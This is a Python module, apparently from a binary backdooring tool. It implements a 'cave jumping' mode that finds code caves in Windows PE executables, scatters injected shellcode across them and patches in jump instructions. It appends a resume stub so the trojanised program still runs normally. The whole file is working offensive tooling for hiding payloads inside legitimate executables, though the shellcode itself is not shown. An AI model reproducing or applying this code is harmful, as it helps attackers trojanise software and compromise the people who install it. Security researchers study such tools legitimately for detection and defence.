import os
import logging
from core import enum
from pe.core import core
from pe.core import eat_code_caves
import struct
logger = logging.getLogger(__name__)


class cave_jumping:

    def __init__(self,BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """cave_jumping"""
        self.description = """Hook entry point patching methods"""
        self.requirements = {
                            }
        self.BDF = BDF
        self.supported_methods = ['jmp_at_entrypoint', 'call_at_entrypoint']

    def invoke_mode(self):

        return self.find_cave()

    def find_cave(self):
        self.BDF.pe_object['cave_jumping'] = True
        self.BDF.pe_object['len_allshells'] = ()

        for item in self.BDF.pe_object['allshells']:
            self.BDF.pe_object['len_allshells'] += (len(item), )

        self.BDF.pe_object['len_allshells'] += (len(self.BDF.pe_object['resumeExe']), )
        self.BDF.SIZE_CAVE_TO_FIND = sorted(self.BDF.pe_object['len_allshells'])[0]

        modifier = core.core(self.BDF)

        if hasattr(modifier, self.BDF.options['MODIFIER'].lower()):
            logger.debug(f"Modifier: {self.BDF.options['MODIFIER']}")
            self.BDF.found_modifier = getattr(modifier, self.BDF.options['MODIFIER'].lower())
        else:
            logger.error('No found modifier')
            return False

        if self.BDF.found_modifier() != True:
            return False

        logger.debug(f"Caves Picked {self.BDF.pe_object['CavesPicked']}")

        return True

    def get_patch_instr(self):

        if self.BDF.found_payload.payload_type != 'staged':
            self.BDF.temp_jmp = b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.BDF.pe_object, 1, 2)
            test_length = int(self.BDF.pe_object['CavesPicked'][2][1], 16) - int(self.BDF.pe_object['CavesPicked'][1][1], 16) - len(self.BDF.pe_object['allshells'][1]) - 5

            if test_length < 0:
                self.BDF.temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.BDF.pe_object['allshells'][1]) - 4))
            else:
                self.BDF.temp_jmp += struct.pack("<I", breakupvar - len(self.BDF.pe_object['allshells'][1]) - 5)

        self.BDF.pe_object['allshells'] += (self.BDF.pe_object['resumeExe'], )

        logger.debug(f"self.BDF.pe_object['allshells']: {len(self.BDF.pe_object['allshells'])}")

        for i, item in self.BDF.pe_object['CavesPicked'].items():
            logger.debug(f"[->] Location: {hex(int(self.BDF.pe_object['CavesPicked'][i][1], 16))}, {i}")
            self.BDF.patch_instr[int(self.BDF.pe_object['CavesPicked'][i][1], 16)] = self.BDF.pe_object['allshells'][i]

            # So we can jump to our resumeExe shellcode
            if i == (len(self.BDF.pe_object['CavesPicked']) - 2) and self.BDF.found_payload.payload_type != 'staged':
                self.BDF.patch_instr['CONT' + str(i)] = self.BDF.temp_jmp

        return True
